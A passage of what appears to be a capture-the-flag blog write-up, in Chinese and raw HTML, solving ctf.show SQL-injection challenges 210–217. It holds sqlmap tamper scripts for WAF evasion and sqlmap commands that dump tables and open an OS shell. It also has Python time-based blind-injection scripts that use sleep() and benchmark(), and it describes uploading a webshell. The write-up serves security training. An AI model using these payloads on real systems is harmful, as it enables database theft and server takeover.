class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-空格替换制表符0x09,=号换like"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">space2comment</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'\''</span>:</span><br><span class="line">                    quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'"'</span>:</span><br><span class="line">                    doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'='</span>:</span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>) + <span class="string">'like'</span> + chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">"*"</span>:</span><br><span class="line">                retVal += chr(<span class="number">0x31</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">" "</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对查询字符进行解密</span><br><span class="line">  function decode($id)&#123;</span><br><span class="line">    return strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>先对字符串进行64解码，然后再反转字符，再套一层，我们写个相反就的行了</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-base编码两次-反转两次"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = encode(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">" "</span>,chr(<span class="number">0x09</span>))</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --batch --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --threads&#x3D;10 --cookie&#x3D;&quot;PHPSESSID&#x3D;hnfvub4a2sfnmofk3g7r28vc39; ctfshow&#x3D;72a5a5bfd041b4dc7fac9cfa9f868db6&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;my</span><br></pre></td></tr></table></figure></div>

<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><blockquote>
<ul>
<li>和上题一样，过滤了空格号，不影响，我上个代码中写了替换空格为0x09也就是制表符</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://6848c055-1297-4397-8dc0-d2477ea293db.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=my -D ctfshow_web -T ctfshow_flavia --dump</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><blockquote>
<ul>
<li>和上题一样过滤多加了个*不影响我们</li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;2b123cfd-31cd-465e-b7cb-1e1470122ae4.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --batch --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --threads&#x3D;10 --cookie&#x3D;&quot;PHPSESSID&#x3D;hnfvub4a2sfnmofk3g7r28vc39; ctfshow&#x3D;72a5a5bfd041b4dc7fac9cfa9f868db6&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;2b123cfd-31cd-465e-b7cb-1e1470122ae4.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;my  -T ctfshow_web -T  ctfshow_flavis --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><blockquote>
<ul>
<li>这题需要getshell，因为过滤的和上题一样，就用我那个过滤脚本</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-base编码两次-反转两次"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = encode(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">" "</span>,chr(<span class="number">0x09</span>))</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p><strong>然后接着我们进行getshell上传一个上传点</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6309ef18-4721-4f5c-919d-bf47c71c749e.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://6309ef18-4721-4f5c-919d-bf47c71c749e.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=my --os-shell</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731164027857.png" alt="image-20210731164027857"></p>
<p><strong>上传一句话木马，蚁剑连接</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731164139622.png" alt="image-20210731164139622"></p>
<p><strong>在根目录下有flag</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731164205840.png" alt="image-20210731164205840"></p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><blockquote>
<ul>
<li>时间盲注，直接脚本跑</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://5eb465ee-6eeb-4508-9fea-5496e3ad2a8f.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = "if(substr(database(),&#123;&#125;,1)='&#123;&#125;',sleep(3),0)"</span></span><br><span class="line"><span class="comment">#payload = "if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line"><span class="comment">#payload = "if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagx'),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line">payload = <span class="string">"if(substr((select group_concat(flaga) from ctfshow_flagx),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end - start)</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">4.9</span> <span class="keyword">and</span> end - start &lt; <span class="number">6.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731173410636.png" alt="image-20210731173410636"></p>
</blockquote>
<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><blockquote>
<ul>
<li>题目提示说加了单引号，我们就闭合掉，改一下上面的代码，继续跑</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://fed15780-e37b-48e2-8e96-86d984f46b94.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查数据库payload = "1' or if(substr(database(),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line"><span class="comment">#查表payload = "1' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line"><span class="comment">#查字段payload = "1' or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxc'),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line">payload = <span class="string">"1' or if(substr((select group_concat(flagaa) from ctfshow_flagxc),&#123;&#125;,1)='&#123;&#125;',sleep(3),0) #"</span></span><br><span class="line"><span class="comment">#payload = "if(substr((select group_concat(flaga) from ctfshow_flagx),&#123;&#125;,1)='&#123;&#125;',sleep(5),0)"</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">2.9</span> <span class="keyword">and</span> end - start &lt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id &#x3D; from_base64($id);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>加了个base64解密，所以我们用“MQ==”–&gt;1 所以就会算是true，这题没单引号，所以改一下上一题代码。</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://83e21d02-6e3a-4c01-9016-79367bdcb966.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#'MQ==' or if(1=1,sleep(5),0)</span></span><br><span class="line"><span class="comment">#payload = "'MQ==' or if(substr(database(),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line"><span class="comment">#payload = "'MQ==' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line"><span class="comment">#payload = "'MQ==' or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxcc'),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line">payload = <span class="string">"'MQ==' or if(substr((select group_concat(flagaac) from ctfshow_flagxcc),&#123;&#125;,1)='&#123;&#125;',sleep(5),0) "</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">4.9</span> <span class="keyword">and</span> end - start &lt; <span class="number">6.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731182828100.png" alt="image-20210731182828100"></p>
<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;屏蔽危险分子</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F;sleep&#x2F;i&#39;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了sleep,可以换一个函数benchmark(6666666,sha(1))</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">benchmark(6666666,sha(1))</span><br><span class="line">第一个参数指的是执行次数、第二参数指的是执行语句</span><br></pre></td></tr></table></figure></div>

<p><strong>将上一个payload改一下，跑一下就出来了，因为是执行次数来确定延时时间，所以也跟你家网速波动有关系，适当调试，我控制在一个1.4ms到4.9ms，应该能保证普通网速的，如果你网速超快，适当调整</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = "http://fe186d5a-2385-43fd-8d4a-d557cc25b038.challenge.ctf.show:<span class="number">8080</span>//api/<span class="string">"</span></span><br><span class="line"><span class="string">str = "</span><span class="number">01234567890</span>abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，<span class="string">"</span></span><br><span class="line"><span class="string">flag = ""</span></span><br><span class="line"><span class="string">#1 or if(substr(database(),&#123;&#125;,1)='&#123;&#125;',benchmark(6666666,sha(1)),0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#payload = "</span><span class="number">1</span> <span class="keyword">or</span> <span class="keyword">if</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),&#123;&#125;,<span class="number">1</span>)=<span class="string">'&#123;&#125;'</span>,<span class="keyword">benchmark</span>(<span class="number">6666666</span>,<span class="keyword">sha</span>(<span 